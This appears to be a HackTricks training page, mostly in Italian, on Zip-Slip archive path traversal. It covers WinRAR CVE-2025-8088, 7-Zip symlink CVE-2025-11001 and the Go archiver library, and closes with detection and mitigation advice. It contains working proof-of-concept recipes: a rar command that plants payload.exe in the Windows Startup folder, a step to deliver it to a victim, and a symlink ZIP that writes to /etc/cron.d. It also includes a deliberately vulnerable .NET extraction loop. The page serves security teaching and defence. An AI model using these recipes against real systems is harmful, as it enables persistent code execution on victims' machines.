# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Panoramica

Molti formati di archivio (ZIP, RAR, TAR, 7-ZIP, ecc.) permettono a ogni voce di avere un proprio **percorso interno**. Quando un'utilità di estrazione rispetta ciecamente quel percorso, un nome file appositamente creato contenente `..` o un **percorso assoluto** (es. `C:\Windows\System32\`) verrà scritto al di fuori della directory scelta dall'utente.
Questa classe di vulnerabilità è ampiamente nota come *Zip-Slip* o **archive extraction path traversal**.

Le conseguenze vanno dalla sovrascrittura di file arbitrari fino al raggiungimento diretto di **remote code execution (RCE)** lasciando un payload in una posizione di **auto-run**, come la cartella *Startup* di Windows.

## Causa principale

1. L'attaccante crea un archivio in cui una o più intestazioni file contengono:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. La vittima estrae l'archivio con uno strumento vulnerabile che si fida del percorso incorporato (o segue symlinks) invece di sanificarlo o forzare l'estrazione sotto la directory scelta.
3. Il file viene scritto nella posizione controllata dall'attaccante ed eseguito/caricato la prossima volta che il sistema o l'utente attiva quel percorso.

### .NET `Path.Combine` + `ZipArchive` traversal

Un anti-pattern comune in .NET è combinare la destinazione prevista con **controllato dall'utente** `ZipArchiveEntry.FullName` ed estrarre senza normalizzazione del percorso:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` inizia con `..\\` esegue traversal; se è un **absolute path** la componente di sinistra viene scartata completamente, generando un **arbitrary file write** come extraction identity.
- Archivio proof-of-concept per scrivere in una directory sorella `app` monitorata da uno scanner schedulato:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Lasciare quell'archivio ZIP nella casella di posta monitorata produce `C:\samples\app\0xdf.txt`, dimostrando traversal al di fuori di `C:\samples\queue\` e abilitando primitive successive (ad es., DLL hijacks).

## Esempio reale – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR per Windows (inclusi il CLI `rar` / `unrar`, la DLL e il codice sorgente portabile) non validava i nomi dei file durante l'estrazione.
Un archivio RAR malevolo contenente una voce come:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
si troverebbe **fuori** dalla directory di output selezionata e nella cartella *Startup* dell'utente. Dopo il logon, Windows esegue automaticamente tutto ciò che è presente lì, fornendo RCE *persistente*.

### Creazione di un archivio PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – conserva i percorsi dei file esattamente come forniti (**non** potare il `./` iniziale).

Consegnare `evil.rar` alla vittima e istruirla a estrarlo con una build vulnerabile di WinRAR.

### Observed Exploitation in the Wild

ESET ha segnalato campagne di spear-phishing RomCom (Storm-0978/UNC2596) che allegavano archivi RAR sfruttando CVE-2025-8088 per distribuire backdoor personalizzate e facilitare operazioni di ransomware.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Sovrascrivere `Start Menu/Programs/Startup` o posizioni eseguite da servizi → il codice viene eseguito al prossimo logon o al riavvio del servizio.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Su una build patchata `/etc/cron.d` non verrà toccato; il symlink viene estratto come link dentro /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Elencare le voci dell'archivio e segnalare qualsiasi nome contenente `../`, `..\\`, *percorsi assoluti* (`/`, `C:`) o voci di tipo *symlink* il cui target è fuori dalla directory di estrazione.
* **Canonicalisation** – Assicurarsi che `realpath(join(dest, name))` inizi ancora con `dest`. Rifiutare altrimenti.
* **Sandbox extraction** – Decomprimere in una directory usa-e-getta usando un extractor *safe* (es., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verificare che i percorsi risultanti rimangano all'interno della directory.
* **Endpoint monitoring** – Generare allarmi su nuovi eseguibili scritti nelle posizioni `Startup`/`Run`/`cron` poco dopo che un archivio è stato aperto da WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ and 7-Zip 25.00+ implement path/symlink sanitisation. Entrambi gli strumenti sono ancora sprovvisti di aggiornamento automatico.
2. Estrarre gli archivi con l'opzione “**Do not extract paths**” / “**Ignore paths**” quando possibile.
3. Su Unix, ridurre i privilegi e montare un **chroot/namespace** prima dell'estrazione; su Windows, usare **AppContainer** o una sandbox.
4. Se si scrive codice custom, normalizzare con `realpath()`/`PathCanonicalize()` **prima** di creare/scrivere, e rifiutare qualsiasi voce che esca dalla destinazione.

## Additional Affected / Historical Cases

* 2018 – Ampio advisory *Zip-Slip* di Snyk che ha interessato molte librerie Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 traversamento simile durante il merge `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) traversamento nell'estrazione TAR in slugs (patch in v1.2).
* Qualsiasi logica di estrazione custom che non chiami `PathCanonicalize` / `realpath` prima della scrittura.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
